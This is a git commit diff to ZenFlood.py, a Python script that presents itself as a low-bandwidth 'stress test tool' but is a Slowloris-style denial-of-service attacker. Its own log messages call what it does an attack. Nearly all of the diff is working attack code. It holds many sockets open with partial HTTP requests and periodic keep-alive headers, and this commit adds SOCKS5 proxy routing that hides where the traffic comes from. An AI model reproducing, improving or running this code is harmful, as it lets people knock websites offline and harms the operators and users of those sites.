b79f20f3ba4abcda9bf5adfb4d56ad6e3a1a2519
*Zen_Rat* <95986478+ZenRAT-47@users.noreply.github.com>
2024-03-14 20:53:37 +0200

    Update ZenFlood.py

--- ZenFlood.py
+++ ZenFlood.py
@@ -15,7 +15,6 @@ Written by ZenRat-47. https://github.com/ZenRAT-47. Special Occasions.
 
 """
 
-#!/usr/bin/env python3
 
 import argparse
 import logging
@@ -26,9 +25,7 @@ import time
 import ssl
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(
-        description="ZenFlood, low bandwidth stress test tool for websites"
-    )
+    parser = argparse.ArgumentParser(description="ZenFlood, low bandwidth stress test tool for websites")
     parser.add_argument("host", nargs="?", help="Host to perform stress test on")
     parser.add_argument("-p", "--port", default=80, type=int, help="Port of webserver, usually 80")
     parser.add_argument("-s", "--sockets", default=150, type=int, help="Number of sockets to use in the test")
@@ -62,11 +59,13 @@ def init_socket(ip, port, https, proxy_settings):
         s = ctx.wrap_socket(s, server_hostname=ip)
 
     if proxy_settings['use']:
-        import socks  # Importing here to avoid unnecessary dependency if not using proxy
-        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_settings['host'], proxy_settings['port'])
-        socket.socket = socks.socksocket
+        from socks import setdefaultproxy, socksocket, PROXY_TYPE_SOCKS5  # Lazy import
+        setdefaultproxy(PROXY_TYPE_SOCKS5, proxy_settings['host'], proxy_settings['port'])
+        s = socksocket()
+        s.connect((ip, port))
+    else:
+        s.connect((ip, port))
 
-    s.connect((ip, port))
     return s
 
 def send_line(sock, line):
@@ -75,15 +74,12 @@ def send_line(sock, line):
 def send_header(sock, name, value):
     send_line(sock, f"{name}: {value}")
 
-def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets):
+def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets, proxy_settings):
     list_of_sockets = []
     for _ in range(num_sockets):
         try:
-            s = init_socket(host, port, https)
-            if randuseragent:
-                ua = random.choice(user_agents)
-            else:
-                ua = user_agents[0]
+            s = init_socket(host, port, https, proxy_settings)
+            ua = random.choice(user_agents) if randuseragent else user_agents[0]
             send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
             send_header(s, "User-Agent", ua)
             send_header(s, "Accept-language", "en-US,en,q=0.5")
@@ -92,22 +88,22 @@ def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets)
             logging.debug(f"Failed to create new socket: {e}")
     return list_of_sockets
 
-def zenflood_attack(host, port, sockets, sleeptime, https, randuseragent):
-    user_agents = [...]  # List of user agents
+def zenflood_attack(host, port, sockets, sleeptime, https, randuseragent, proxy_settings):
+    user_agents = [...]  # Your list of user agents here
 
     logging.info("Attacking %s with %s sockets.", host, sockets)
-    socket_list = init_socket_list(host, port, https, user_agents, randuseragent, sockets)
+    socket_list = init_socket_list(host, port, https, user_agents, randuseragent, sockets, proxy_settings)
 
     while True:
         logging.info("Sending keep-alive headers. Socket count: %s", len(socket_list))
-        for s in list(socket_list):
+        for s in socket_list[:]:
             try:
                 send_header(s, "X-a", str(random.randint(1, 5000)))
             except socket.error:
                 socket_list.remove(s)
 
         if len(socket_list) < sockets:
-            socket_list.extend(init_socket_list(host, port, https, user_agents, randuseragent, sockets - len(socket_list)))
+            socket_list += init_socket_list(host, port, https, user_agents, randuseragent, sockets - len(socket_list), proxy_settings)
 
         logging.debug("Sleeping for %d seconds", sleeptime)
         time.sleep(sleeptime)
@@ -116,13 +112,10 @@ def main():
     args = parse_arguments()
     configure_logging(args.verbose)
 
-    if args.useproxy:
-        proxy_settings = {'use': True, 'host': args.proxy_host, 'port': args.proxy_port}
-    else:
-        proxy_settings = {'use': False}
+    proxy_settings = {'use': args.useproxy, 'host': args.proxy_host, 'port': args.proxy_port} if args.useproxy else {'use': False}
 
     try:
-        zenflood_attack(args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
+        zenflood_attack(args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragents, proxy_settings)
     except KeyboardInterrupt:
         logging.info("Stopping ZenFlood attack.")
     except Exception as e:
@@ -130,4 +123,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
